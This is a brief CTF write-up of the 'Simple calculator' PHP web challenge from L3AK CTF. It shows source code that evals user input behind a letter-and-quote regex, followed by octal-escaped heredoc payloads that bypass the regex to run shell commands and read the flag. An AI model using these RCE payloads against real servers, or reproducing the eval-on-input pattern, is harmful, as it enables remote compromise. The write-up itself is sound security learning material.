---
title: L3AK CTF Web
layout: post
categories: [CTF, Writeup]
tags: [ctf,web]     # TAG names should always be lowercase
---
<span style="color:red">Challenge : </span> **`Simple calculator`**

<span style="color:red">Categorie : </span> **`Web`**

This was a simple PHP challenge, the source code was provided and it was simple to read and understand.

```php
<?php
function popCalc() {
if (isset($_GET['formula'])) {
$formula = $_GET['formula'];
if (strlen($formula) >= 150 || preg_match('/[a-z\'"]+/i', $formula)) {
return 'Try Harder !';
}
try {
eval('$calc = ' . $formula . ';');
return isset($calc) ? $calc : '?';
} catch (ParseError $err) {
return 'Error';
}
}
}$result = popCalc();
echo "Result: " . $result; 
?>
```

The goal is clear, we need to bypass the regex and get an RCE via the `formula` parameter. The payload must be less than 150 chars and contains no letters or quotes (’|“).

A quick search leeds to this great resource: [https://gist.github.com/ChrisPritchard/50ef7a6c79a2386037a77ccc4709d1ff](https://gist.github.com/ChrisPritchard/50ef7a6c79a2386037a77ccc4709d1ff)

it’s almost the same condition, so we just need to use the same approach to get our flag.

Find the flag : **`find flag*`** 

**`(<<<*%0A%5C145%5C170%5C145%5C143%0A*)(<<<*%0A%5C146%5C151%5C156%5C144%20%5C146%5C154%5C141%5C147%5C52%0A*)`**

And to get the flag : **`cat flag*`**

**`(<<<*%0A%5C145%5C170%5C145%5C143%0A*)(<<<*%0A%5C143%5C141%5C164%20%5C146%5C154%5C141%5C147%5C52%0A*)`**

<span style="color:red">Flag : </span> **`L3AK{PhP_Web_Ch@ll3ng3}`**
